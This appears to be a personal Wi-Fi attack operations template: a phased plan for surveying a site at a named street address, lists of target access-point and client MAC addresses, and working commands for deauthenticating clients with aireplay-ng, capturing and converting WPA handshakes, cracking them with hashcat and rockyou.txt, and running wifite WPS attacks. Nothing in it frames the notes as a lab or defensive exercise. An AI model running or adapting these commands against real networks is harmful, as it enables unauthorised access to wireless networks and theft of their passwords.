#Target Templates
#Situation:
PHASE0: around the site
PHASE1: initial survey + discovery
---reasses----
PHAEE2: Tailor route to accespoints, execute focused survey
PHASE3: position to throw exploit
PHASE4: 
    option A: Break onsite
    Option B: Break back in rear
#Position:
8530 Washington Blvd, Jessup, MD 20794
#Operation:
Wi-Fi Survey
#Time:
Jan 15 2024, 13:41

#SSID(human network name)##############


#BSSID(Make address)##############
1. 48:22:54:D5:ED:4E - TOPHAT 1
2. 30:DE:4B:3D:1E:D4 - TOPHAT 2
3. C0:C9:E3:00:AD:42 - tophat3

#CHANNEL##############


#MAKE/MODEL##############


#ENCRYPTION##############


#ASSOCIATED CLIENTS##############
1. E2:51:49:B9:75:4B - tophat1
3. 

#DEAUTH##############
sudo aireplay-ng -0 1 -a <TARGET AP> -c <TGT CLIENT> wlx00c0cab46234 
hcxpcapngtool -o dict.hash.22000 Lab1.handshake # this will generate a hash of the file
hashcat -a 0 -m 22000 dict.hash.22000 rockyou.txt
--
tophat 1
sudo aireplay-ng -0 1 -a 74:DA:88:59:96:A9 -c 00:CB:CB:69:14:CB kismon0
sudo aireplay-ng -0 1 -a C0:C9:E3:00:AD:42 -c C0:EE:FB:5A:52:45 kismon0


#PIXIE/REAVER/WPS CRACK##############
sudo wifite --wps-only 

---

#EVIL TWIN##############
---